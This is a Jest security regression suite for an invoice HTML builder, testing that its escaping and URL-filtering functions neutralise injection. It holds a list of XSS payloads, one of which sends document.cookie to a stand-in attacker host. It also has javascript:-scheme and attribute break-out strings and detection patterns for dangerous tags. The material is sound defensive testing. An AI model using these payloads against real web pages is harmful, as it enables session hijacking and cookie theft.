/**
 * SECURITY REGRESSION SUITE — invoice HTML injection.
 *
 * The invoice is built by string-interpolating order/profile/settings data
 * into an HTML template, which is then either rendered by expo-print (native)
 * or written into an `about:blank` window via `document.write` (web target,
 * where that window inherits the app's origin).
 *
 * Before the fix, the only sanitisation was `clean()`, which strips COMPLETE
 * `<...>` tags. That is not escaping:
 *   - an unterminated `<` passes through untouched, and the next literal `>`
 *     in the template (e.g. from `</p>`) closes the attacker's tag;
 *   - `&`, `"` and `'` were never handled.
 *
 * The injectable sources are real: `userDetails.name`/`address`/`phone` come
 * from the signed-in user's own editable profile, `order.userName` can be set
 * by an admin order-create flow, and product titles plus the `settings` row
 * (company name, logo URL, footer, UPI id) are admin-controlled.
 *
 * These tests assert the invariant directly: NO payload placed in any input
 * may produce an executable construct in the output.
 */
jest.mock('expo-print', () => ({ printToFileAsync: jest.fn() }));
jest.mock('expo-sharing', () => ({ isAvailableAsync: jest.fn(), shareAsync: jest.fn() }));
jest.mock('react-native', () => ({ Platform: { OS: 'ios' } }));
jest.mock('@/services/settingsService', () => ({ getInvoiceSettings: jest.fn(async () => ({})) }));

const { esc, escUrl, computeInvoiceData, buildInvoiceHtml } = require('@/utils/invoice');

/** Payloads that defeat a tag-stripping "sanitiser" but not real escaping. */
const PAYLOADS = [
  // Unterminated tag — the template's own `>` finishes it.
  '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)"',
  '<svg onload=alert(1)',
  // Terminated tags — stripped by clean(), still must be escaped not removed.
  '<script>alert(1)</script>',
  '<iframe src="javascript:alert(1)"></iframe>',
  // Attribute break-out.
  '" onmouseover="alert(1)',
  "' onfocus='alert(1)",
  // Entity / double-encoding games.
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '&#60;script&#62;',
  // Comment-context escape.
  '--><script>alert(1)</script><!--',
];

const baseOrder = (overrides = {}) => ({
  id: 'ord_1',
  createdAt: '2026-01-15T10:00:00.000Z',
  total: 1180,
  paymentMethod: 'razorpay',
  paymentStatus: 'paid',
  products: [{ title: 'Dark Chocolate 70%', quantity: 2, finalPrice: 500, discount: 0 }],
  ...overrides,
});

/**
 * An executable construct is a `<tag`, or a `>` that could terminate one that
 * the template did not itself open. Escaped output contains neither: every
 * attacker-supplied angle bracket becomes `&lt;`/`&gt;`.
 */
const assertNoLiveMarkupFrom = (html, payload) => {
  // The payload must not appear verbatim anywhere.
  expect(html).not.toContain(payload);
  // No unescaped `<` from the payload: any `<` in the payload is now `&lt;`.
  const dangerousOpeners = ['<img', '<svg', '<script', '<iframe', '<!--', '-->'];
  for (const opener of dangerousOpeners) {
    expect(html.toLowerCase()).not.toContain(opener.toLowerCase());
  }
  // No event handler survived as a real attribute.
  expect(html).not.toMatch(/\son(error|load|mouseover|focus|click)\s*=/i);
};

describe('esc()', () => {
  it('escapes all five HTML-significant characters', () => {
    expect(esc('&')).toBe('&amp;');
    expect(esc('<')).toBe('&lt;');
    expect(esc('>')).toBe('&gt;');
    expect(esc('"')).toBe('&quot;');
    expect(esc("'")).toBe('&#39;');
  });

  it('escapes & first so other replacements are not double-escaped', () => {
    // If `<` were escaped before `&`, the resulting `&lt;` would become
    // `&amp;lt;` and render as the literal text "&lt;".
    expect(esc('<a>')).toBe('&lt;a&gt;');
    expect(esc('a & b')).toBe('a &amp; b');
    expect(esc('&lt;')).toBe('&amp;lt;');
  });

  it('neutralises every known payload', () => {
    for (const p of PAYLOADS) {
      const out = esc(p);
      expect(out).not.toContain('<');
      expect(out).not.toContain('>');
      expect(out).not.toContain('"');
    }
  });

  it('handles null, undefined and non-strings without throwing', () => {
    expect(esc(null)).toBe('');
    expect(esc(undefined)).toBe('');
    expect(esc(0)).toBe('0');
    expect(esc(false)).toBe('false');
    expect(esc({ a: 1 })).toBe('[object Object]');
  });
});

describe('escUrl()', () => {
  it('allows http, https and base64 image data URLs', () => {
    expect(escUrl('https://cdn.example/logo.png')).toBe('https://cdn.example/logo.png');
    expect(escUrl('http://cdn.example/logo.png')).toBe('http://cdn.example/logo.png');
    expect(escUrl('data:image/png;base64,iVBORw0KGgo=')).toBe('data:image/png;base64,iVBORw0KGgo=');
  });

  it('rejects script-bearing schemes that contain no escapable characters', () => {
    // This is why escaping alone is insufficient in a URL context.
    expect(escUrl('javascript:alert(1)')).toBe('');
    expect(escUrl('JaVaScRiPt:alert(1)')).toBe('');
    expect(escUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe('');
    expect(escUrl('vbscript:msgbox(1)')).toBe('');
    expect(escUrl('  javascript:alert(1)')).toBe('');
  });

  it('escapes quotes in an otherwise-allowed URL so it cannot break the attribute', () => {
    expect(escUrl('https://x.example/a" onerror="alert(1)')).not.toContain('"');
  });

  it('rejects empty and non-URL input', () => {
    expect(escUrl('')).toBe('');
    expect(escUrl(null)).toBe('');
    expect(escUrl('/relative/path.png')).toBe('');
  });
});

describe('buildInvoiceHtml() — no input can inject live markup', () => {
  it.each(PAYLOADS)('customer name payload: %s', (payload) => {
    const d = computeInvoiceData(baseOrder(), { name: payload }, {});
    assertNoLiveMarkupFrom(buildInvoiceHtml(d), payload);
  });

  it.each(PAYLOADS)('address payload: %s', (payload) => {
    const d = computeInvoiceData(baseOrder(), { name: 'A', address: payload }, {});
    assertNoLiveMarkupFrom(buildInvoiceHtml(d), payload);
  });

  it.each(PAYLOADS)('structured address field payload: %s', (payload) => {
    const d = computeInvoiceData(
      baseOrder(),
      { name: 'A', address: { street: payload, city: 'X', state: 'Y', pincode: '1' } },
      {}
    );
    assertNoLiveMarkupFrom(buildInvoiceHtml(d), payload);
  });

  it.each(PAYLOADS)('product title payload: %s', (payload) => {
    const order = baseOrder({
      products: [{ title: payload, quantity: 1, finalPrice: 100, discount: 0 }],
    });
    assertNoLiveMarkupFrom(buildInvoiceHtml(computeInvoiceData(order, { name: 'A' }, {})), payload);
  });

  it.each(PAYLOADS)('admin settings payload: %s', (payload) => {
    const settings = {
      companyName: payload,
      address: payload,
      email: payload,
      footerTitle: payload,
      footerSubNote: payload,
      upiId: payload,
      supportEmail: payload,
      gstin: payload,
    };
    const d = computeInvoiceData(baseOrder(), { name: 'A' }, settings);
    assertNoLiveMarkupFrom(buildInvoiceHtml(d), payload);
  });

  it.each(PAYLOADS)('promo code payload: %s', (payload) => {
    const order = baseOrder({ promoCode: payload, promoDiscount: 50 });
    assertNoLiveMarkupFrom(buildInvoiceHtml(computeInvoiceData(order, { name: 'A' }, {})), payload);
  });

  it.each(PAYLOADS)('payment method / transaction id payload: %s', (payload) => {
    const order = baseOrder({ paymentMethod: payload, razorpayPaymentId: payload });
    assertNoLiveMarkupFrom(buildInvoiceHtml(computeInvoiceData(order, { name: 'A' }, {})), payload);
  });

  it('never emits a javascript: logo URL', () => {
    const d = computeInvoiceData(baseOrder(), { name: 'A' }, { logo: 'javascript:alert(1)' });
    const html = buildInvoiceHtml(d);
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('<img');
  });

  it('still renders a legitimate logo', () => {
    const d = computeInvoiceData(baseOrder(), { name: 'A' }, { logo: 'https://cdn.example/l.png' });
    expect(buildInvoiceHtml(d)).toContain('<img src="https://cdn.example/l.png" />');
  });

  it('keeps benign text readable rather than mangling it', () => {
    // Escaping must not destroy ordinary punctuation in real names/companies.
    const d = computeInvoiceData(
      baseOrder(),
      { name: "Priya D'Souza", address: 'Flat 3 & 4, MG Road' },
      { companyName: 'Sweets & Co. <Bengaluru>' }
    );
    const html = buildInvoiceHtml(d);
    expect(html).toContain('Priya D&#39;Souza');
    expect(html).toContain('Flat 3 &amp; 4, MG Road');
    expect(html).toContain('Sweets &amp; Co.');
  });

  it('produces a well-formed document for a normal order', () => {
    const html = buildInvoiceHtml(computeInvoiceData(baseOrder(), { name: 'Asha' }, {}));
    expect(html).toContain('TAX INVOICE');
    expect(html).toContain('Asha');
    expect(html.match(/<html>/g)).toHaveLength(1);
    expect(html.match(/<\/html>/g)).toHaveLength(1);
    // Balanced table tags.
    expect(html.match(/<table>/g).length).toBe(html.match(/<\/table>/g).length);
  });
});